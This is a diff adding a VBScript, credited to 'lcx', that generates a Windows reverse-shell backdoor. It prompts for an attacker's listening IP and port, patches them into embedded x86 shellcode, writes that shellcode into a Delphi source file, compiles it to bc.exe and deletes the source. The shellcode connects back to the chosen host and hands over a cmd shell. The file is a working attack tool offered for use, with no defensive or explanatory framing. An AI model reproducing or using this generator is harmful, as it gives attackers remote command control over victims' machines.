@@ -1,0 +1,56 @@
+'code by lcx
+Dim WshShell, oExec,ip,port
+ip= InputBox( "请输入监听ip的地址：", "输入", "192.168.8.200" )
+port= InputBox( "请输入监听端口：", "输入", "53" )
+
+re=Hex(port)
+If Len(re)=2 Then re="00"&re
+If Len(re)=3 Then re="0"&re
+For i=0 To 3
+c= Hex(Split(ip,".")(i))
+If Len(c)<2 Then c=0&c
+result=result&"#$"&c&","
+Next
+Set Fso=CreateObject("Scripting.FileSystemObject")
+with Fso.opentextfile(left(Wscript.ScriptFullName,len(Wscript.ScriptFullName)-len(Wscript.ScriptName))&"\bc.dpr",2,true)
+.writeline"program bc;"
+.writeline"const"
+.writeline"  ShellCode:Array[0..286] of Char="
+.writeline"("
+.writeline"#$fc,#$6a,#$eb,#$4d,#$e8,#$f9,#$ff,#$ff,#$ff,#$60,#$8b,#$6c,#$24,#$24,#$8b,#$45,"
+.writeline"#$3c,#$8b,#$7c,#$05,#$78,#$01,#$ef,#$8b,#$4f,#$18,#$8b,#$5f,#$20,#$01,#$eb,#$49,"
+.writeline"#$8b,#$34,#$8b,#$01,#$ee,#$31,#$c0,#$99,#$ac,#$84,#$c0,#$74,#$07,#$c1,#$ca,#$0d,"
+.writeline"#$01,#$c2,#$eb,#$f4,#$3b,#$54,#$24,#$28,#$75,#$e5,#$8b,#$5f,#$24,#$01,#$eb,#$66,"
+.writeline"#$8b,#$0c,#$4b,#$8b,#$5f,#$1c,#$01,#$eb,#$03,#$2c,#$8b,#$89,#$6c,#$24,#$1c,#$61,"
+.writeline"#$c3,#$31,#$db,#$64,#$8b,#$43,#$30,#$8b,#$40,#$0c,#$8b,#$70,#$1c,#$ad,#$8b,#$40,"
+.writeline"#$08,#$5e,#$68,#$8e,#$4e,#$0e,#$ec,#$50,#$ff,#$d6,#$66,#$53,#$66,#$68,#$33,#$32,"
+.writeline"#$68,#$77,#$73,#$32,#$5f,#$54,#$ff,#$d0,#$68,#$cb,#$ed,#$fc,#$3b,#$50,#$ff,#$d6,"
+.writeline"#$5f,#$89,#$e5,#$66,#$81,#$ed,#$08,#$02,#$55,#$6a,#$02,#$ff,#$d0,#$68,#$d9,#$09,"
+.writeline"#$f5,#$ad,#$57,#$ff,#$d6,#$53,#$53,#$53,#$53,#$43,#$53,#$43,#$53,#$ff,#$d0,#$68,"
+.writeline result&"#$66,#$68,"&"#$"&Left(re,2)&","&"#$"&Right(re,2)&","&"#$66,#$53,#$89,#$e1,#$95,#$68,#$ec,#$f9,"
+.writeline"#$aa,#$60,#$57,#$ff,#$d6,#$6a,#$10,#$51,#$55,#$ff,#$d0,#$66,#$6a,#$64,#$66,#$68,"
+.writeline"#$63,#$6d,#$6a,#$50,#$59,#$29,#$cc,#$89,#$e7,#$6a,#$44,#$89,#$e2,#$31,#$c0,#$f3,"
+.writeline"#$aa,#$95,#$89,#$fd,#$fe,#$42,#$2d,#$fe,#$42,#$2c,#$8d,#$7a,#$38,#$ab,#$ab,#$ab,"
+.writeline"#$68,#$72,#$fe,#$b3,#$16,#$ff,#$75,#$28,#$ff,#$d6,#$5b,#$57,#$52,#$51,#$51,#$51,"
+.writeline"#$6a,#$01,#$51,#$51,#$55,#$51,#$ff,#$d0,#$68,#$ad,#$d9,#$05,#$ce,#$53,#$ff,#$d6,"
+.writeline"#$6a,#$ff,#$ff,#$37,#$ff,#$d0,#$68,#$e7,#$79,#$c6,#$79,#$ff,#$75,#$04,#$ff,#$d6,"
+.writeline"#$ff,#$77,#$fc,#$ff,#$d0,#$68,#$f0,#$8a,#$04,#$5f,#$53,#$ff,#$d6,#$ff,#$d0"
+.writeline");"
+.writeline"begin"
+.writeline"  asm"
+.writeline"    lea eax,ShellCode"
+.writeline"    call eax"
+.writeline"  end;"
+.writeline"end."
+.close
+end with
+WScript.Sleep(100)
+If Fso.FileExists(left(Wscript.ScriptFullName,len(Wscript.ScriptFullName)-len(Wscript.ScriptName))&"\bc.dpr") Then 
+Set WshShell = CreateObject("WScript.Shell")
+Set oExec    = WshShell.Exec("dcc32.dll bc.dpr")
+Else
+WScript.echo "bc.dpr还没有生成"
+End If
+msgbox "ok,生成了bc.exe"
+Fso.DeleteFile "bc.dpr", True 
+Set Fso=Nothing
